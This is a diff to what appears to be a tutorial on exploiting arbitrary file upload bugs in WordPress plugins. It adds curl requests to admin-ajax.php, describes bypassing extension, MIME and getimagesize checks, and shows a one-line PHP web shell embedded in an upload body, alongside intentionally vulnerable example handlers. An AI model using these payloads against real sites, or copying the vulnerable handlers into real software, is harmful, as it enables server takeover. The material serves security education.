@@ -47,7 +47,7 @@ add_action("wp_ajax_unpack_fonts", "unpack_fonts");
 
 function unpack_fonts(){
     $file = $_FILES["file"];
-    $ext = end(explode('.',$file_name));
+    $ext = end(explode('.',$file["name"]));
 
     if($ext !== "zip"){
         die();
@@ -60,13 +60,13 @@ function unpack_fonts(){
     $f = $zip->open($file_path);
 
     if($f){
-        $zip->extractTo(WP_CONTENT_DIR + "/uploads/");
+        $zip->extractTo(WP_CONTENT_DIR . "/uploads/");
         $zip->close();
     }
 }
 ``` 
 
-To bypass the above check we need to prepare a valid zip file and add a malicious PHP file inside the zip file. Below is the example of a raw HTTP request to trigger the Arbitrary File Upload:
+To bypass the above check we need to prepare a valid zip file and add a malicious PHP file inside the zip file. Below is the example of a raw HTTP and cURL request to trigger the Arbitrary File Upload:
 
 ```http
 POST /wp-admin/admin-ajax.php HTTP/1.1
@@ -87,6 +87,12 @@ Content-Type: application/zip
 <MALICIOUS_ZIP_METADATA>
 ------WebKitFormBoundary4Qx3GCzIwMf0iOPi--
 
+```
+
+OR
+
+```bash
+curl -F 'file=@pwn.zip' 'http://localhost/wp-admin/admin-ajax.php?action=unpack_fonts' -H 'Cookie: <AUTHENTICATED_USER_COOKIE>'
 ```
 
 ## Bypass Techniques
@@ -124,7 +130,7 @@ function upload_image_check_mime(){
 }
 ```
 
-To bypass the above check we need to prepare a valid PNG file and append a malicious PHP code to the PNG file metadata. Below is the example of a raw HTTP request to trigger the Arbitrary File Upload:
+To bypass the above check we need to prepare a valid PNG file and append a malicious PHP code to the PNG file metadata then rename the file with php extension. Below is the example of a raw HTTP and cURL request to trigger the Arbitrary File Upload:
 
 
 ```http
@@ -148,6 +154,12 @@ Content-Type: image/png
 
 ```
 
+OR
+
+```bash
+curl -F 'file=@pwn.php' 'http://localhost/wp-admin/admin-ajax.php?action=upload_image_check_mime'
+```
+
 ### Image Related Check
 
 Most of the file upload process is for an image type of file. Sometimes, developers only check for conditions that are related to an image file. One of the common functions to be used for image-related checks is [`getimagesize`](https://www.php.net/manual/en/function.getimagesize.php) function.
@@ -161,7 +173,7 @@ function upload_image_getimagesize(){
     $file = $_FILES["file"];
     $file_path = WP_CONTENT_DIR . "/uploads/" . $file["name"];
     $size = getimagesize($file["tmp_name"]);
-    $fileContent = file_get_contents($_FILES['file']);
+    $fileContent = file_get_contents($_FILES['file']["tmp_name"]);
 
     if($size){
         file_put_contents($file_path, $fileContent);
@@ -173,7 +185,7 @@ function upload_image_getimagesize(){
 }
 ```
 
-To bypass the above check we need to prepare a valid image file and append a malicious PHP code to the image file metadata. Below is the example of a raw HTTP request to trigger the Arbitrary File Upload:
+To bypass the above check we need to prepare a valid image file and append a malicious PHP code to the image file metadata then rename the file with php extension. Below is the example of a raw HTTP and cURL request to trigger the Arbitrary File Upload:
 
 ```http
 POST /wp-admin/admin-ajax.php HTTP/1.1
@@ -194,6 +206,12 @@ Content-Type: image/png
 <?php echo system($_GET["id"]); ?>
 ------WebKitFormBoundary4Qx3GCzIwMf0iOPi--
 
+```
+
+OR
+
+```bash
+curl -F 'file=@pwn.php' 'http://localhost/wp-admin/admin-ajax.php?action=upload_image_getimagesize'
 ```
 
 ## Article References
